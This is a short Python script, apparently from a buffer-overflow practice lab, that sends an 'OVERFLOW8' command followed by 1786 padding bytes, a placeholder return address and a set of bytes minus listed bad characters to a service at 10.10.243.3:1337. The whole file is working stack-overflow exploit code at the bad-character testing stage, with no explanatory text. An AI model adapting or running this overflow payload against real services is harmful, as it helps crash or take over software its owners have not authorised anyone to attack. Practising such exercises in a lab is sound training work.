import socket, struct
host, port = '10.10.243.3',1337



command = b'OVERFLOW8 '
length = 2000
offset = 1786
new_eip = b'BBBB'
bad_chars = [
b'\x1d',
b'\x2e',
b'\xc7',
b'\xee'
]
all_chars = bytearray(range(1,256))
for bad_char in bad_chars:
        all_chars = all_chars.replace(bad_char, b'')




payload = b''.join([

command,
b'A' * offset,
new_eip,
all_chars,
b'C' * (length - offset - len(new_eip) - len(all_chars)),


])





with socket.socket() as s:
        s.connect((host, port))
        s.send(payload)
